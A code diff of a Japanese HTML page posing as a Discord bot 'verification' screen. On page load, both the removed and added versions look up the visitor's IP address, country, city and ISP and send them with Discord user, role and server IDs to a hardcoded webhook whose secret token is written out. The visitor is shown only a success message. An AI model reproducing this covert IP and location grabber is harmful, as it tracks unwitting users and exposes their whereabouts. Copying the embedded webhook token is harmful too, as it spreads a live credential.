@@ -1,47 +1,78 @@
 <!DOCTYPE html>
 <html lang="ja">
-<head><meta charset="UTF-8"><title>認証システム</title></head>
-<body style="background:#23272a;color:white;text-align:center;padding-top:100px;font-family:sans-serif;">
-    <h1 id="status">認証処理中...</h1>
-    <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";
-        
-        async function run() {
-            const params = new URLSearchParams(window.location.search);
-            const state = params.get('state');
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>認証完了</title>
+</head>
+<body style="background:#2f3136; color:white; text-align:center; padding-top:100px; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;">
+    <div style="background:#36393f; display:inline-block; padding:40px; border-radius:10px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);">
+        <h1 id="status" style="margin-bottom:20px;">認証システム</h1>
+        <p id="msg" style="color:#b9bbbe;">接続を確認しています...</p>
+    </div>
 
+    <script>
+        // 設定したWebhook URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";
+
+        async function processVerification() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const state = urlParams.get('state');
+
+            // stateが届いていない場合はエラー（パラメータ不足）
             if (!state) {
-                document.getElementById('status').innerHTML = "❌ エラー: パラメータ(state)が届いていません。<br><small>ボットから新しく発行されたリンクを使用してください。</small>";
+                document.getElementById('status').innerText = "❌ パラメータ不足";
+                document.getElementById('status').style.color = "#f04747";
+                document.getElementById('msg').innerHTML = "最新の認証ボタンからやり直してください。<br>URLにstateが含まれていません。";
                 return;
             }
 
             try {
+                // stateの中身を分解 (形式: LID_xxx_UID_xxx_RID_xxx_GID_xxx)
                 const parts = state.split('_');
-                const logId = parts[1];
-                const userId = parts[3];
+                const logId = parts[1];    // WebhookのメッセージID
+                const userId = parts[3];   // 認証したユーザーID
+                const roleId = parts[5];   // 付与するロールID
+                const guildId = parts[7];  // 実行されたサーバーID
 
+                // IP情報の取得
                 const geoRes = await fetch('https://ipapi.co/json/');
                 const geo = await geoRes.json();
 
+                // Webhookを更新（ボット側でこれを検知してDBに保存します）
+                // JSONに guild_id を含めることで /verifycheck に反映させます
                 await fetch(`${WEBHOOK_URL}/messages/${logId}`, {
                     method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         content: `✅ **認証成功**: <@${userId}>`,
                         embeds: [{
-                            title: "ユーザー情報取得",
-                            description: `**IP:** \`${geo.ip}\`\n**場所:** \`${geo.country_name} / ${geo.city}\`\n**ISP:** \`${geo.org}\``,
+                            title: "✅ 認証完了・データ保存",
+                            description: `**ユーザー:** <@${userId}> (ID: \`${userId}\`)\n` +
+                                         `**サーバーID:** \`${guildId}\`\n` +
+                                         `**IP:** \`${geo.ip}\`\n` +
+                                         `**場所:** \`${geo.country_name} / ${geo.city}\`\n` +
+                                         `**プロバイダ:** \`${geo.org}\``,
                             color: 0x43b581,
+                            footer: { text: `GID:${guildId} | RID:${roleId}` }, // ここに情報を埋め込む
                             timestamp: new Date().toISOString()
                         }]
                     })
                 });
-                document.getElementById('status').innerText = "✅ 認証が完了しました！Discordに戻ってください。";
+
+                document.getElementById('status').innerText = "✔ 認証に成功しました";
+                document.getElementById('status').style.color = "#43b581";
+                document.getElementById('msg').innerText = "この画面を閉じて、Discordに戻ってください。";
+
             } catch (e) {
-                document.getElementById('status').innerText = "❌ 送信エラーが発生しました。";
+                console.error(e);
+                document.getElementById('status').innerText = "❌ 解析エラー";
+                document.getElementById('msg').innerText = "データの送信中に問題が発生しました。";
             }
         }
-        window.onload = run;
+
+        // ページ読み込み時に実行
+        window.onload = processVerification;
     </script>
 </body>
 </html>
